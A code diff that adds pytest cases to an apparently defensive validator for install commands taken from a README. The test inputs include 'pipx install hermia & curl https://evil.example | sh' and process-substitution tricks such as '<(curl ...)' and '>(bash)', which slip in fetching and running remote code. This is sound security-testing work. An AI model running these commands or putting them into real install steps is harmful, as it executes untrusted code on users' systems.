@@ -193,3 +193,24 @@ def test_python_dash_c_is_no_longer_allowed(tmp_path):
     readme = _write_install_readme(tmp_path, "python -c 'import os; os.system(\"id\")'")
     with pytest.raises(ExtractionError, match=r"token 'python' not in allowlist"):
         extract_install_commands(readme_path=readme, expected_methods=("pipx",))
+
+
+def test_chained_command_via_single_ampersand_rejected(tmp_path):
+    """`pipx install hermia & curl evil` — single `&` backgrounds and chains."""
+    readme = _write_install_readme(tmp_path, "pipx install hermia & curl https://evil.example | sh")
+    with pytest.raises(ExtractionError, match=r"token 'curl' not in allowlist"):
+        extract_install_commands(readme_path=readme, expected_methods=("pipx",))
+
+
+def test_process_substitution_lt_paren_rejected(tmp_path):
+    """`pipx install <(curl evil)` — process substitution runs curl before install sees anything."""
+    readme = _write_install_readme(tmp_path, "pipx install <(curl -s https://evil.example)")
+    with pytest.raises(ExtractionError, match=r"disallowed process substitution"):
+        extract_install_commands(readme_path=readme, expected_methods=("pipx",))
+
+
+def test_process_substitution_gt_paren_rejected(tmp_path):
+    """`pipx install >(bash)` — same failure mode via output process substitution."""
+    readme = _write_install_readme(tmp_path, "pipx install >(bash)")
+    with pytest.raises(ExtractionError, match=r"disallowed process substitution"):
+        extract_install_commands(readme_path=readme, expected_methods=("pipx",))
